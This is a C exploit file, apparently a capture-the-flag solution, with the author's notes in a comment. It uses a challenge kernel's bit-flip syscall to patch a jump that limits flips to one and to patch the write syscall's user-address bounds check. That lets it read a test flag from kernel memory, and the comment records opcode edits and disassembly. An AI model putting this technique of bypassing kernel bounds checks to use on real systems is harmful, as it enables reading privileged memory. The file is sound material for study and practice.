#include "nonstd.h"
#include "sched.h"
#include "stdio.h"

char failed[] = "Failed \n";
char test[] = "Testing\n";

int main()
{
        unsigned long flip_bitFlip = 0xffffffff8010a604; //addr of the line  if(Scheduler::instance()->flipped_already != 0) (jet)
        unsigned long flip_write = 0xffffffff8010a755;  //addr of the line if ((buffer >= USER_BREAK) || (buffer + size > USER_BREAK))
        unsigned long flag_addr = 0xffffffff8013294d; //find it with search  "gctf{TEST_FLAG_NOT_REAL_HF}"
        puts("[*] START EXPLOIT");
        if(flipBit((char*)flip_bitFlip,0)){
                write(1,failed,sizeof(failed));
                return 1;
        }

        
        
        for(int i =1;i<=5;i++){
             if(flipBit((char*)flip_write,i)){
                write(1,failed,sizeof(failed));
                return 1;
                }   
        }
        write(1, (char *)flag_addr, 0x30);
        puts("\n[*] END EXPLOIT");

        return 0;
}
/*----------------LITLE WRITE UP FOR HELPING ME TO TAKE NOTES OF STUFF-------------------------------
BITFLIP START SYSSCALL ADDR : 0xffffffff8010a5d4
WRITE START SYSCALL ADDR : 0xffffffff8010a732
BIT FLIP EDIT
0F84FDFFFFFF   0F85FDFFFFFF  0000111110000100   0000111110000101 confronto beetween JE E JNE before in hex and after in bin

WRITE EDIT 
0xffffffff8010a754: 0x8b48e0558b481a72 //istruzione jump below 
comparison beetween jb normal off and changed off
normal off
0xffffffff8010a754:	0x8b48e0558b481a72
0F826CA71080   11111000001001101100101001110001000010000000  crucial 11011
changed off 
0F8276A71080   11111000001001110110101001110001000010000000  crucial 11101
0xffffffff8010a754:	0x8b48e0558b482472

this works online because we are doing a debug print 

0xffffffff8010a77a:	mov    QWORD PTR [rbp-0x8],0x0
   0xffffffff8010a782:	cmp    QWORD PTR [rbp-0x18],0x1
   0xffffffff8010a787:	jne    0xffffffff8010a7f0
   0xffffffff8010a789:	mov    rdx,0xffffffff80133c48
   0xffffffff8010a790:	mov    esi,0x22
   0xffffffff8010a795:	mov    rdi,0xffffffff80133c50
   0xffffffff8010a79c:	mov    eax,0x0
   0xffffffff8010a7a1:	call   0xffffffff801050b0





*/


